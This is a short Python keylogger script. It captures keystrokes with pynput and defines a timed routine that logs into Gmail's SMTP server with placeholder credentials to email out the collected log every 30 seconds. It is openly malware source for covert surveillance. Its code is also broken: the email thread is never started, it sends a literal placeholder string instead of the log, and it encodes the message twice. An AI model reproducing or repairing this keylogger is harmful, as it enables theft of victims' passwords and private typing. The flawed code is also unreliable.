from pynput import keyboard
import smtplib
import threading

log="Key Logs: "

def main_func():
    def callback_function(key):
        global log
        #log = log + str(key).replace("'","")
        try:
            #log = log + str(key.char.encode("utf-8"))
            log = log + str(key.char)
        except AttributeError:
            if key == key.enter:
                pass
    with keyboard.Listener(on_press=callback_function) as listener:
        listener.join()

def send_email(sender,receiver,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login("youremail","yourpassword")
    email_server.sendmail(sender,receiver,message.encode("utf-8"))

def thread_func():
    global log
    send_email("sender","receiver","message".encode("utf-8"))
    log=""
    timer_object=threading.Timer(30,thread_func)
    timer_object.start()

main_func()
